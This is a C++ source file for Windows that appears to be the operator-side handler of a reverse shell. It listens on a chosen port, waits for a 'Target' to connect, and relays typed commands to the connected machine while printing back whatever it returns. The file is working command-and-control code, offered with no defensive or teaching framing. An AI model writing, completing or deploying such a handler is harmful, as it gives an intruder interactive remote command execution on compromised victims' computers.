#include <iostream>
#include <WinSock2.h>
#include <cstring>
#include <thread>
#include <string>

using namespace std;

class Handler {
private:
    WSADATA ws;

    int serverSocket;
    struct sockaddr_in server;

    int clientSocket;

public:
    Handler(int serverPort) {
        int wsaErr = WSAStartup(MAKEWORD(2, 2), &ws);
        if (wsaErr != 0) {
            cout << "! WSADATA has not been able to be set" << endl;

            exit(1);
        }

        this->serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (serverSocket < 0) {
            cout << "! Socket has been failed to create" << endl;

            exit(1);
        }

        int optval = 1;
        int socketSetError = setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval));
        if (socketSetError < 0) {
            cout << "! Socket has not been able to set" << endl;

            exit(1);
        }

        u_long mode = 0;
        int ioctlErr = ioctlsocket(serverSocket, FIONBIO, &mode);
        if (ioctlErr != NO_ERROR) {
            cout << "! Setting socket mode has been failed" << endl;

            exit(1);
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(serverPort);
        server.sin_addr.s_addr = INADDR_ANY;
        memset(&server.sin_zero, 0, sizeof(server.sin_zero));
    }

    void serverBind() {
        int bindErr = bind(serverSocket, (struct sockaddr*)&server, sizeof(server));
        if (bindErr < 0) {
            cout << "! Bind operation has failed" << endl;

            exit(1);
        } else {
            cout << "! Bind operation has been executed" << endl;
        }
    }

    void serverListen() {
        int listenErr = listen(serverSocket, 1);
        if (listenErr < 0) {
            cout << "! Listening operation has failed" << endl;

            exit(1);
        } else {
            cout << "! Listening operation has been executed" << endl;
        }
    }

    void serverAccept() {
        while (true) {
            struct sockaddr_in client;
            int clientLength = sizeof(client);

            clientSocket = accept(serverSocket, (struct sockaddr*)&client, &clientLength);
            if (clientSocket < 0) {
                cout << "! Target has failed to connect" << endl;
            } else {
                cout << "! Target has connected" << endl;

                break;
            }
        }
    }
        
    void serverSend(const char* command) {
        int commandLength = strlen(command);
        int sendError = send(clientSocket, command, commandLength, 0);
        if (sendError < 0) {
            cout << "! Send operation has failed" << endl;
            
            //when the handler cannot send command, the handler tries to send it five times by waiting
            int i = 1;
            while( i <= 5 ) {
                Sleep(1000);

                sendError = send(clientSocket, command, commandLength, 0);

                if (sendError > 0) {
                    break;
                }

                if (sendError < 0 && i == 5) {
                    closesocket(clientSocket);
                }

                i++;
            }
        }
    }

    string serverReceive() {
        string data = "";
         //i wanted to implement dynamic buffer
        while (true) {
            char buffer[1024] = { 0, };

            int bytesReceived = recv(clientSocket, buffer, 1024, 0);
            if (bytesReceived > 0) {
                data += buffer;

                /*
                        i used \n as "end of data" flag in packages
                        firstly, the codes finds it and extracts it from the data handler receives
                        after that, i delete the value of the output pointer, and put new data into the pointer
                 */
                int result = data.find("\\n");
                if (result != string::npos) {
                    string extractedData = "";

                    for (int i = 0; i < result; i++) {
                        extractedData += data[i];
                    }
                    
                    swap(data, extractedData);
                        
                    break;
                }
            }
        }

        return data;
    }

    /*~Handler() {
        closesocket(serverSocket);
        WSACleanup();

        cout << "! Server socket has been closed and WSACleanup has been run" << endl;
    }*/
};

int main(int argc, char *argv[]) {
    Handler handler(stoi(argv[1]));

    handler.serverBind();

    handler.serverListen();

    handler.serverAccept();

    while (true) {
        string command;
        cout << ">> ";
        getline(cin, command);
        command += "\\n"; //i use "\n" as "end of data" flag

        handler.serverSend(command.c_str());

        string output = handler.serverReceive();
        cout << endl << output << endl;
    }
}
